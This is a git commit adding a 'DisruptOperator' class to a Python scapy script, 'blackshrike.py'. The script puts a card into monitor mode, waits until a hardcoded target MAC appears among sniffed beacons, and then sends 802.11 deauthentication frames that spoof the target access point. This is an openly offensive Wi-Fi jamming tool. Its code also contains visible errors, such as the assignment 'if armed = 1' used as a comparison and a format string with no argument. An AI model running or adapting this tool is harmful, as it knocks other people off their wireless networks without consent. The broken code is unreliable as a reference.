f3fc8954f7b84b77191ae3398a1d7aaedfc6de0b
root <root@laptop>
2017-05-21 20:44:48 +0000

    Add DisruptOperator class

--- blackshrike.py
+++ blackshrike.py
@@ -1,9 +1,10 @@
 from scapy.all import * 
 import re
 import os 
+import threading 
 
 target = '5c:57:1a:b8:26:d0'
-
+armed = 0
 ap_list = []
 
 def initialize_monitor():
@@ -14,7 +15,7 @@ def initialize_monitor():
                 if not re.search(r'Inter-',line) and not re.search(r'face',line):
                     iface=line.split(":")[0]
    if iface:
-        print 'Initializing monitor mode [airmon method]'
+        print('Initializing monitor mode [airmon method]')
         os.system('airmon-ng start {0}'.format(iface.strip()))
    
 
@@ -25,13 +26,15 @@ def packet_process(pkt):
       if pkt.type == 0 and pkt.subtype == 8:
          if pkt.addr2 not in ap_list:
             ap_list.append(pkt.addr2)
-            print "AP MAC {0} SSID {1}".format(pkt.addr2,pkt.info)
+            print("AP MAC {0} SSID {1}".format(pkt.addr2,pkt.info))
             
 
 def stop_scan():
    global ap_list
    global target
+   global armed 
    if target in ap_list:
+      armed = 1
       return True
    else:
       return False 
@@ -41,13 +44,30 @@ def load_mon():
    with open("/proc/net/dev","r") as f:
       for line in f.readlines():
          if re.search(r'mon[0-9]+',line):
-            print "Found airmon-ng interface..",line.split(":")[0].strip()
+            print("Found airmon-ng interface..",line.split(":")[0].strip())
             mon_interface.append(line.split(":")[0].strip())
    return mon_interface
 
 
 def seek_target():
-
+   global armed 
    mons = load_mon() 
    sniff(iface=mons[0], prn=packet_process, stop_filter=stop_scan)
+   if armed = 1:
+      print("Target {0} has been located")
+      return True
+
+
+class DisruptOperator(threading.Thread):
+    def __init__(self,count=20,target=None):
+        threading.Thread.__init__(self)
+        self.target=target
+        self.count = count
+        self.pkt=scapy.all.RadioTap()/scapy.all.Dot11(addr1="ff:ff:ff:ff:ff:ff",add
+r2=target,addr3=target)/scapy.all.Dot11Deauth()
+
+    def run(self):
+        print("Starting deauth at {0} packets".format(self.count))
+        for item in range(0, self.count):
+            scapy.all.sendp(self.pkt, iface="mon1",count=1, inter=.2, verbose=0)
 
